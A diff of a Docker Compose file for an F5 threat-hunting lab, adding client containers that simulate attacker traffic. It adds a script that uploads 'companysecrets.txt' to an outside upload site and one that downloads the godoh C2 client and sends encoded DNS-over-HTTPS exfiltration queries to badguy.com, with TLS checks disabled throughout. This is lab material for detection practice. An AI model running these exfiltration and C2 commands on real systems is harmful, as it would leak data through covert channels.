@@ -1,6 +1,6 @@
 ## SSL Orchestrator :: Threat Hunting Lab :: Clients
 ## Maintainer: kevin-at-f5-dot-com
-## Last Updated: 2025-Feb-07
+## Last Updated: 2025-Feb-19
 ##
 ## Description: Provides a set of containers to perform various client functions:
 ##   - eicar_client
@@ -18,14 +18,21 @@
 ##   - dnsbeacon_client
 ##        src: 192.168.80.69
 ##        function: Bash script to dig beacon.cloudsecurity.ninja on 10s interval
+##   - carepackage_client
+##        src: 192.168.80.80
+##        function: Python script that sends an encoded payload
+##   - doh-client
+##        src: 192.168.80.25
+##        function: Bash script that simulates a DNS-over-HTTP exfiltration
 ##
 ## start containers
 ##   docker compose -f docker-sslo-threathunting-clients-vX.yaml up -d
 ##
+## access containers
+##   docker exec -it eicar_client /bin/bash
+##
 ## watch containers
 ##   docker logs -f eicar_client
-##   docker logs -f beacon_client
-##   docker logs -f random_requests_client
 ##
 ## stop containers
 ##   docker compose -f docker-sslo-threathunting-clients-vX.yaml down
@@ -43,11 +50,11 @@ services:
       - /bin/bash
       - -c
       - |
-        ## update and install required binaries
+        ## Update and install required binaries
         apt -o "Acquire::https::Verify-Peer=false" update
         apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools
 
-        ## start container with infinite curl loop -- sleep for some random time between 60 and 120 seconds
+        ## Start container with infinite curl loop -- sleep for some random time between 60 and 120 seconds
         sleep 20
         while true
         do
@@ -69,11 +76,11 @@ services:
       - /bin/bash
       - -c
       - |
-        ## update and install required binaries
+        ## Update and install required binaries
         apt -o "Acquire::https::Verify-Peer=false" update
         apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools python3 python3-requests
 
-        ## create beaconClient.py
+        ## Create beaconClient.py
         cat > "/beaconClient.py" << 'EOF'
         import requests
         import time
@@ -168,7 +175,7 @@ services:
             main()
         EOF
 
-        ## start beaconClient
+        ## Start beaconClient
         python3 /beaconClient.py
 
 
@@ -187,44 +194,30 @@ services:
       - /bin/bash
       - -c
       - |
-        ## update and install required binaries
+        ## Update and install required binaries
         apt -o "Acquire::https::Verify-Peer=false" update
         apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 git curl python3 python3-pip iputils-ping net-tools
         pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org pip requests psutil
  
-        ## import randomRequests project
+        ## Import randomRequests project
         git -c http.sslVerify=false clone https://github.com/snowblind-/randomRequests.git
  
-        ## add ipv4 addresses
-        ## ips: 192.168.80.21  -> .68
-        ## ips: 192.168.80.70  -> .201
-        ## ips: 192.168.80.203 -> .221
-        ## ips: 192.168.80.223 -> .252     
-        
-        for i in `seq 21 1 68`
+        ## Add ipv4 addresses (minus used IPs)        
+        usedIPs=(20 25 69 80 202 222)
+        for i in `seq 21 1 252`
         do
-          ip address add 192.168.80.$$i dev eth0
-        done
-
-        for i in `seq 70 1 201`
-        do
-          ip address add 192.168.80.$$i dev eth0
-        done
-
-        for i in `seq 203 1 221`
-        do
-          ip address add 192.168.80.$$i dev eth0
-        done
-
-        for i in `seq 223 1 252`
-        do
-          ip address add 192.168.80.$$i dev eth0
+          if [[ $${usedIPs[@]} =~ $$i ]]
+          then
+            continue
+          else
+            ip address add 192.168.80.$$i dev eth0
+          fi
         done
  
-        ## start container in infinite loop
+        ## Start container in infinite loop
         #tail -f /dev/null
  
-        ## start container with randomRequest execution
+        ## Start container with randomRequest execution
         sleep 20
         while true
         do
@@ -245,11 +238,11 @@ services:
       - /bin/bash
       - -c
       - |
-        ## update and install required binaries
+        ## Update and install required binaries
         apt -o "Acquire::https::Verify-Peer=false" update
         apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools dnsutils
 
-        ## start container with infinite curl loop
+        ## Start container with infinite curl loop
         sleep 20
         while true
         do
@@ -257,6 +250,7 @@ services:
           sleep 10
         done
 
+  
   carepackage_client:
     #https://github.com/therealnoof/findthesheep/blob/main/carePackage.py
     container_name: carepackage_client
@@ -282,7 +276,7 @@ services:
       import mimetypes
       from ssl import create_default_context
       
-      # Define the file name and remote URL
+      ## Define the file name and remote URL
       file_name = 'companysecrets.txt'
       remote_url = 'https://practice.expandtesting.com/upload'  # Replace with your actual remote IP or URL
       
@@ -361,6 +355,79 @@ services:
 
       ## start carePackage
       python3 /carePackage.py
+
+
+  doh-client:
+    container_name: doh-client
+    image: ubuntu:24.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    networks: 
+      clientnet:
+        ipv4_address: 192.168.80.25
+    extra_hosts:
+      - "cloudflare-dns.com: 192.168.100.16"
+    command:
+      - /bin/bash
+      - -c
+      - |
+        ## Install packages
+        apt update && apt install -y wget curl jq dnsutils net-tools iputils-ping
+        
+        ## Install q (DoH) client
+        echo 'deb [trusted=yes] https://repo.natesales.net/apt /' > /etc/apt/sources.list.d/natesales.list
+        apt update && apt install -y q
+
+        ## Install godoh c2 (client)
+        mkdir /godoh
+        wget https://github.com/sensepost/godoh/releases/download/1.6/godoh-linux64 -O /godoh/godoh
+        chmod +x /godoh/godoh
+
+        ## Spoof cloudflare-dns.com to local DoH server
+        echo "192.168.100.16   cloudflare-dns.com" >> /etc/hosts
+
+        ## Start a never ending task to keep container running
+        #tail -f /dev/null
+
+        ## Create DoH C2 agent exfiltration spoof
+        cat > "/doh-agent.sh" << 'EOF'
+        #!/bin/bash
+        while true
+        do
+          ## Send a polling request a random number of times (10-50)
+          i=1
+          cnt=$$(( (RANDOM % 40) + 10 ))
+          while [ $$i -le $$cnt ]
+          do
+            curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=396c396336.badguy.com&type=16'
+            i=$$((i + 1))
+            sleep 10
+          done
+
+          ## Sleep 10
+          sleep 10
+
+          ## Make a simulated c2 exfiltration request
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.be.0.00.1.0.0.0.0.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.1.647872e4.1.3.1f8b08000000000002ff000e02f1fdce8e7b218bc336818afabb42844efe.7f3a11d50b4cc16e65da7f8e2d8d1766c08f4d4128b907d848bac92c5a8b.55a0f77f657da7fe28505f2d4cb6ce980e8c70928ba613cbadf1c8177452.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.2.8b061369.1.3.ac8efa7dc42aa01f85851aed4607725ed4f353a76e597a224085ec2a5aad.24490ee3b4dd8fe9e989fb79e0ae710cb813d10e4658dd2ac385ad4a3cd1.89ca151cc1ebfc138d5f89f87117fe18351a989a2e8f713311046508ac86.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.3.9f2e010a.1.3.b793618136bd8da9bf4997cc8976a1b1a1f091405ae84de8f73e2eaed603.fb9d9c4374a514e9ffe31cb4d5747e8e1f8a27e45c5ff22e0afb91865a87.7516cba2640c41b68a57b0c2361af419317fe787fc7bd5a23c4f61c6b3e7.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.4.3be78615.1.3.4be768f6402e0228bcf587456bd8c86adf35449ac5407bf0c55723517ee9.48ea2d6b83c55a36f1facdc326de01dae3314c1154f09c85d1ea577335f5.c0e4dd2ec3de7dfcd351d437e111ec7a4aa2d088f20cb32241e51aadf0d1.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.5.f5b8bcb3.1.3.a347d343128653611b63a882a3f1a0a86bbc8f27abc759f4cd072d036c00.6f906846c73f2b12b7a71f3dd6a7bfe0e4c0213591e206590c8d57750ec6.a0c41e15ce0343fb8c1fc34519ecf3b05c45ffe286d62844bed8dda236b2.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.6.cc900086.1.3.33eebdc35a48013edd5665c1c54445a2eca20bc5591f1e6844de26e4d918.c67e3e5910a4e0d6dd92b6d251a2181a5b3bdb1fa7ef30781282734ed137.56c0121d2acce9e09a20d67c82e1e33301d945146035590723f490198513.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ef.7.e1fd3b9.1.1.94010000ffff06f29f640e020000.0.0.badguy.com&type=1'
+          curl -sk -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?cd=false&do=false&name=9890.ca.8.00.1.0.0.0.0.badguy.com&type=1'
+
+          ## Sleep 20 seconds and then restart the loop
+          sleep 20
+        done
+        EOF
+
+        ## Make script executable
+        chmod +x /doh-agent.sh
+
+        ## Run script
+        /doh-agent.sh
 
 
 networks:
